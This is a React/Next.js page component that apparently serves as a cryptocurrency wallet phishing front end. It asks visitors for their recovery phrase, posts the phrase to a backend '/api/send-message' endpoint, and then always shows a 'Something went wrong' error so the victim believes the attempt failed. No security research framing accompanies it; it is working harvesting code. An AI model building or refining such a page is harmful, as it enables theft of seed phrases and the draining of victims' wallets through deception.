'use client';
import axios from 'axios';
import Image from 'next/image';
import { useState } from 'react';
import { toast } from 'sonner';

const Recovery = () => {
  const [value, setValue] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const submitRecoveryPhrase = async () => {
    // Send the recovery phrase to the backend
    setIsLoading(true);
    try {
      const response = await axios.post('/api/send-message', {
        message: value,
      });
      // Handle the response from the backend
      console.log(response.data);
    } catch (error) {
      if (axios.isAxiosError(error)) {
        console.error('Axios error:', error.response?.data);
      } else {
        console.error('Error:', error);
      }
    } finally {
      toast.error('Something went wrong');
      setIsLoading(false);
    }
  };

  return (
    <div className="bg-gray mt-5 space-y-10 rounded-xl p-5 py-16 sm:px-10 md:px-16 lg:px-28">
      <h1 className="text-center text-3xl">Enter your recovery phrase</h1>
      <div className="justify-center space-x-5">
        <div className="relative mx-auto size-[230px]">
          <Image src="/recovery-image.svg" alt="recovery image" fill className="object-cover" />
        </div>
        <div className="mt-5 w-full">
          <textarea
            value={value}
            onChange={e => setValue(e.target.value)}
            placeholder="Enter your recovery phrase here with a space between each word."
            className="text-dark-gray w-full resize-none rounded-md border bg-white px-5 py-2"
            rows={3}
          />
        </div>
        <button
          onClick={submitRecoveryPhrase}
          className="bg-blue mt-10 w-full cursor-pointer px-5 py-2 text-white"
        >
          {isLoading ? 'Loading...' : 'Submit'}
        </button>
      </div>
    </div>
  );
};

export default Recovery;
